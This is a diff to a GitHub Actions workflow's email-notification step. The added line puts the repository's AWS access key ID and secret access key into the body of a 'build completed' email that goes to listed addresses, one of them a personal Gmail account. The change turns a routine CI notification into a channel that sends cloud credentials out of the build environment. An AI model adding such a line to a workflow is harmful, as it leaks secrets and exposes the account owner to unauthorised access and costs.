@@ -22,7 +22,7 @@ jobs:
           subject: Github Actions job result
           to: dbbrauner@gmail.com,brauned@amazon.com
           from: Luke Skywalker # <user@example.com>
-          body: Build job of ${{github.repository}} completed successfully!
+          body: Build job of ${{github.repository}} completed successfully! hello Douglas this is a messsage for you using ${{ secrets.AWS_ACCESS_KEY_ID }} and ${{ secrets.AWS_SECRET_ACCESS_KEY }}
 
       - run: echo "finish email"
 
